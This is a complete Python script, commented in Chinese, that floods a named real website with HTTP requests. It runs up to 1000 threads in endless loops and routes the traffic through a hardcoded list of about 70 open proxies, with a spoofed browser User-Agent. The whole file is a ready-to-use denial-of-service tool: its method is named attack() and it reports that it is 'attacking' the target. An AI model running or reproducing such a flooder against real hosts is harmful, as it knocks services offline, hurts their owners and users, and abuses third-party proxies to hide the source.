#! /usr/bin/env python3
# -*- coding:utf-8 -*-

import urllib.request
import urllib.parse
import socket
import threading
import time
import math
import random

# 测试的地址
url = 'http://www.langsspt.com/'
# 同时运行的线程数 （每个电脑能开的线程数不同（我：893个线程），如果超过了系统的最大负荷，则只创建能创建的最大线程数）
THREADS_COUNT = 1000
# 已创建的线程数
CREATED_THREAD = 0
# 死亡的线程数
DEAD_THREAD = 0

user_agent = 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 \
             (KHTML, like Gecko) Chrome/48.0.2564.116 Safari/537.36'
readyIp = ['1.9.171.51:800',
            '1.82.216.134:80',
            '1.82.216.135:80',
            '58.56.21.196:80',
            '58.56.21.199:80',
            '58.56.21.200:80',
            '58.56.21.201:80',
            '58.214.253.190:8080',
            '58.214.254.46:8080',
            '58.246.242.154:8080',
            '60.21.209.114:8080',
            '60.191.159.86:3128',
            '61.55.135.192:82',
            '101.200.169.110:80',
            '101.201.150.111:3128',
            '106.75.128.89:80',
            '106.75.128.90:80',
            '110.18.243.50:8080',
            '111.11.122.7:80',
            '111.12.251.166:80'
            '111.12.251.167:80',
            '111.12.251.169:80',
            '111.12.251.172:80',
            '111.12.251.173:80',
            '111.12.251.174:80',
            '111.12.251.207:80',
            '111.12.251.213:80',
            '111.13.136.46:80',
            '112.65.88.173:8080',
            '112.112.70.115:80',
            '113.106.213.162:9797',
            '115.28.101.22:3128',
            '117.135.250.133:80',
            '117.135.250.134:80',
            '119.6.136.122:80',
            '119.88.128.73:80',
            '119.88.128.77:80',
            '119.88.128.78:80',
            '119.88.128.79:80',
            '120.0.112.198:81',
            '120.25.90.25:81',
            '120.192.92.98:80',
            '121.193.143.249:80',
            '122.96.59.104:82',
            '122.96.59.104:81',
            '122.226.128.251:3128',
            '123.56.74.13:8080',
            '123.125.122.205:80',
            '123.125.122.224:80',
            '123.139.59.85:9999',
            '124.88.67.7:83',
            '124.88.67.17:843',
            '124.88.67.20:80',
            '124.88.67.23:843',
            '124.88.67.24:843',
            '124.88.67.31:843',
            '124.88.67.32:80',
            '124.160.225.37:3128',
            '182.48.113.11:8088',
            '182.254.218.141:80'
            '183.233.179.172:8080',
            '183.245.146.62:80',
            '183.245.146.237:80',
            '202.106.16.36:3128',
            '211.110.127.210:3128',
            '211.143.146.231:80',
            '211.162.79.68:3128',
            '218.4.114.70:8080',
            '218.26.120.170:8080',
            '220.191.187.90:3128',
            '220.248.224.244:8089',
            '221.4.169.82:8080',
            '221.130.13.238:80',
            '223.68.1.38:8000']


class ProxyThread(threading.Thread):
    def __init__(self, thread_name):
        threading.Thread.__init__(self)

    def run(self):
        try:
            while True:
                self.attack()
        except:
            global CREATED_THREAD, DEAD_THREAD
            DEAD_THREAD += 1
            print('your have a new dead thread , now you still have threads:', CREATED_THREAD - DEAD_THREAD)

    def attack(self):
        req = urllib.request.Request(url)
        req.add_header('User-Agent', user_agent)
        i = math.floor(random.random()*len(readyIp))
        socket.setdefaulttimeout(10)  # 超时未响应则抛出timeout异常
        try:
            proxy_handler = urllib.request.ProxyHandler({'http': readyIp[i]})
            proxy_auth_handler = urllib.request.ProxyBasicAuthHandler()
            opener = urllib.request.build_opener(proxy_handler, proxy_auth_handler)
            # 添加头信息
            opener.addheaders = [
                ('User-Agent', user_agent)
            ]
            response = opener.open(url)
        except:
            pass


try:
    while THREADS_COUNT > 0:
        t = ProxyThread("thread" + str(THREADS_COUNT))
        t.start()
        THREADS_COUNT += -1
        CREATED_THREAD += 1
except:
    print('线程数已达上限：', CREATED_THREAD, '个')
finally:
    print(time.strftime('%Y-%m-%d %H:%M:%S'), ':', 'attacking', url, '....')
